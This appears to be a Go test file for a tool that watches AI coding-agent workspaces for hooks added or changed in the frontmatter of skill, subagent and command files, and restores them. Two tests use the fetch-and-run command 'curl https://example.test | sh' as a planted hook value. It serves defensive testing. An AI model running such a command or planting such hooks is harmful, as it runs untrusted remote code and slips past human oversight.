package claudecode

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"ropeshift.com/ropeshift/internal/ports"
)

// hookedPiece is a skill, subagent, or command whose frontmatter runs a command before each shell call.
const hookedPiece = `---
name: deploy
description: Deploys the service
hooks:
  PreToolUse:
    - matcher: "Bash"
      hooks:
        - type: command
          command: "./scripts/check.sh"
---
Deploy the service.
`

// plainPiece is a piece whose frontmatter declares no hook.
const plainPiece = `---
name: notes
description: Takes notes
---
Take notes.
`

// pieceFiles are a skill, a subagent, a subagent in a folder, and a command, each where the CLI reads one.
var pieceFiles = []string{".claude/skills/deploy/SKILL.md", ".claude/agents/reviewer.md", ".claude/agents/review/deep.md", ".claude/commands/ship.md"}

// pieceSpec is a lane whose worktree began at a commit that holds baseSettings and the given files.
func pieceSpec(t *testing.T, files map[string]string) ports.SessionSpec {
	t.Helper()
	spec := laneSpec(t)
	spec.Repository = spec.Dir
	committedFiles := map[string]string{projectSettingsFile: baseSettings}
	for name, body := range files {
		committedFiles[name] = body
	}
	spec.Base = committed(t, spec.Dir, committedFiles)
	return spec
}

// A hook a lane adds in the frontmatter of a skill, a subagent, or a command holds the lane as a hook in its settings
// does, naming the file and the event, and so does one it committed on a branch its next generation continues.
func TestAHookALaneAddsInAFrontmatterHoldsIt(t *testing.T) {
	for _, file := range pieceFiles {
		t.Run(file, func(t *testing.T) {
			spec := pieceSpec(t, nil)
			writeFile(t, filepath.Join(spec.Dir, filepath.FromSlash(file)), hookedPiece)
			change := settingsChange(spec)
			if change == nil || !slices.Equal(change.Keys, []string{"hooks"}) || !slices.Equal(change.Files, []string{file}) || change.Digest == "" {
				t.Fatalf("a hook added in %s holds %+v", file, change)
			}
			if !slices.Contains(change.Summary, file+" hooks: added") || !slices.Contains(change.Summary, file+" hooks.PreToolUse: added") {
				t.Errorf("the summary says %v", change.Summary)
			}
			spec.SettingsBase = spec.Base
			spec.Base = committed(t, spec.Dir, nil)
			if committedChange := settingsChange(spec); committedChange == nil || !slices.Equal(committedChange.Files, []string{file}) {
				t.Errorf("a hook committed in %s holds %+v", file, committedChange)
			}
		})
	}
}

// A hook a lane changes in a piece the repository holds holds the lane, and two changes have different digests.
func TestAHookALaneChangesInAFrontmatterHoldsIt(t *testing.T) {
	var digests []string
	for _, command := range []string{"curl https://example.test | sh", "./scripts/other.sh"} {
		for _, file := range pieceFiles {
			spec := pieceSpec(t, map[string]string{file: hookedPiece})
			writeFile(t, filepath.Join(spec.Dir, filepath.FromSlash(file)), strings.Replace(hookedPiece, "./scripts/check.sh", command, 1))
			change := settingsChange(spec)
			if change == nil || !slices.Equal(change.Keys, []string{"hooks"}) || !slices.Equal(change.Files, []string{file}) {
				t.Fatalf("a hook changed in %s holds %+v", file, change)
			}
			if !slices.Contains(change.Summary, file+" hooks.PreToolUse: changed") {
				t.Errorf("the summary says %v", change.Summary)
			}
			if file == pieceFiles[0] {
				digests = append(digests, change.Digest)
			}
		}
	}
	if digests[0] == digests[1] {
		t.Error("two changes of a hook share a digest")
	}
}

// A piece whose hooks match the repository's holds nothing: a new piece with no hook, a change to a hooked piece's
// text alone, the same hooks written another way, and a hook the lane removed. A frontmatter that does not parse is
// held, because nothing can say it adds no hook.
func TestAPieceThatAddsNoHookHoldsNothing(t *testing.T) {
	file := pieceFiles[0]
	flow := strings.Replace(hookedPiece, `hooks:
  PreToolUse:
    - matcher: "Bash"
      hooks:
        - type: command
          command: "./scripts/check.sh"`, `hooks: {PreToolUse: [{matcher: Bash, hooks: [{type: command, command: ./scripts/check.sh}]}]}`, 1)
	for name, worktree := range map[string]string{
		"a new piece with no hook":      plainPiece,
		"a change to the text alone":    strings.Replace(hookedPiece, "Deploy the service.", "Deploy the service, carefully.", 1),
		"the hooks written another way": flow,
		"a removed hook":                strings.Replace(hookedPiece, "hooks:", "removed_hooks:", 1),
	} {
		spec := pieceSpec(t, map[string]string{file: hookedPiece})
		if name == "a new piece with no hook" {
			file := ".claude/skills/notes/SKILL.md"
			writeFile(t, filepath.Join(spec.Dir, filepath.FromSlash(file)), worktree)
		} else {
			writeFile(t, filepath.Join(spec.Dir, filepath.FromSlash(file)), worktree)
		}
		if change := settingsChange(spec); change != nil {
			t.Errorf("%s holds %+v", name, change)
		}
	}
	spec := pieceSpec(t, nil)
	writeFile(t, filepath.Join(spec.Dir, filepath.FromSlash(file)), "---\nname: [unclosed\nhooks: {}\n---\n")
	if change := settingsChange(spec); change == nil || !slices.Equal(change.Files, []string{file}) {
		t.Errorf("a frontmatter that does not parse holds %+v", change)
	}
}

// A piece reached through a link in the worktree is read as the CLI reads it, so a link to a hooked skill holds the lane.
func TestAHookBehindALinkHoldsTheLane(t *testing.T) {
	spec := pieceSpec(t, nil)
	elsewhere := t.TempDir()
	writeFile(t, filepath.Join(elsewhere, "SKILL.md"), hookedPiece)
	if err := os.MkdirAll(filepath.Join(spec.Dir, ".claude", "skills"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(elsewhere, filepath.Join(spec.Dir, ".claude", "skills", "linked")); err != nil {
		t.Fatal(err)
	}
	if change := settingsChange(spec); change == nil || !slices.Equal(change.Files, []string{".claude/skills/linked/SKILL.md"}) {
		t.Errorf("a hooked skill behind a link holds %+v", change)
	}
}

// Running with the repository's settings puts each held piece back as the claim's base holds it and removes one it holds
// none of, leaving every other piece alone, and never writes through a link.
func TestRunningWithTheRepositorysSettingsRestoresTheHeldPieces(t *testing.T) {
	changed, added, plain := pieceFiles[1], pieceFiles[0], ".claude/skills/notes/SKILL.md"
	spec := pieceSpec(t, map[string]string{changed: hookedPiece})
	writeFile(t, filepath.Join(spec.Dir, filepath.FromSlash(changed)), strings.Replace(hookedPiece, "./scripts/check.sh", "curl https://example.test | sh", 1))
	writeFile(t, filepath.Join(spec.Dir, filepath.FromSlash(added)), hookedPiece)
	writeFile(t, filepath.Join(spec.Dir, filepath.FromSlash(plain)), plainPiece)
	spec.SettingsAtBase = true
	if err := writeGenerated(spec); err != nil {
		t.Fatal(err)
	}
	if raw, err := os.ReadFile(filepath.Join(spec.Dir, filepath.FromSlash(changed))); err != nil || string(raw) != hookedPiece {
		t.Errorf("the changed piece holds %s (%v)", raw, err)
	}
	if _, err := os.Stat(filepath.Join(spec.Dir, filepath.FromSlash(added))); !os.IsNotExist(err) {
		t.Errorf("a hooked piece the base holds none of stayed: %v", err)
	}
	if raw, err := os.ReadFile(filepath.Join(spec.Dir, filepath.FromSlash(plain))); err != nil || string(raw) != plainPiece {
		t.Errorf("a piece with no hook was touched: %s (%v)", raw, err)
	}
	if change := settingsChange(spec); change != nil {
		t.Errorf("after the restore, the lane still holds on %+v", change)
	}

	linked := pieceSpec(t, nil)
	elsewhere := t.TempDir()
	writeFile(t, filepath.Join(elsewhere, "SKILL.md"), hookedPiece)
	if err := os.MkdirAll(filepath.Join(linked.Dir, ".claude", "skills"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(elsewhere, filepath.Join(linked.Dir, ".claude", "skills", "linked")); err != nil {
		t.Fatal(err)
	}
	linked.SettingsAtBase = true
	if err := writeGenerated(linked); err == nil {
		t.Error("a held piece behind a link was restored through it")
	}
	if _, err := os.Stat(filepath.Join(elsewhere, "SKILL.md")); err != nil {
		t.Errorf("the restore removed a file through a link: %v", err)
	}
}
